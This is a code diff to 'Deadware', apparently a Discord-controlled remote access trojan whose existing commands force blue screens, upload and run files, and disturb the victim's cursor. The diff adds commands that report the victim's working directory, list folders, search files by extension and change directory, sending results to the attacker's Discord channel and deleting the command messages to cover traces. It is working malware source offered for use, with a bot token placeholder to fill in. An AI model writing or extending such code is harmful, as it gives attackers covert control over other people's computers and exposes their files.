@@ -135,6 +135,11 @@ async def help(ctx):
     await ctx.send('blue_screen - forces a temp BSOD')
     await ctx.send('error_drawing - starts cursor drawing')
     await ctx.send('upload - uplaods a file and runs it')
+    await ctx.send('cwd - gets currenct working directory')
+    await ctx.send('dir - lists folders in directory')
+    await ctx.send('ext_search <file extention> - searches for file with extention')
+    await ctx.send('change_dir <folder> - changes file directory')
+
 
 @Deadware.command()
 async def start_typing(ctx, *, msg):
@@ -226,6 +231,33 @@ async def kill_deadware(ctx):
         exit()
     except Exception:
         await ctx.send('Could not stop Deadware')
+
+@Deadware.command()
+async def cwd(ctx):
+    await ctx.message.delete()
+    cwd = os.getcwd()
+    await ctx.send(f'```{cwd}```')
+
+import glob
+@Deadware.command()
+async def dir(ctx):
+    directory = glob.glob('*/')
+    await ctx.message.delete()
+    for dirs in directory:
+        await ctx.send(dirs)
+
+@Deadware.command()
+async def ext_search(ctx, *, ext):
+    await ctx.message.delete()
+    file_type = glob.glob(f'*{ext}')
+    for files in file_type:
+        await ctx.send(files)
+
+@Deadware.command()
+async def change_dir(ctx, *, dir):
+    await ctx.message.delete()
+    os.chdir(dir) 
+    await ctx.send(f'Changed directory')
 
 loop.create_task(Deadware.start('BOT-TOKEN-HERE')) #CHANGE THIS
 
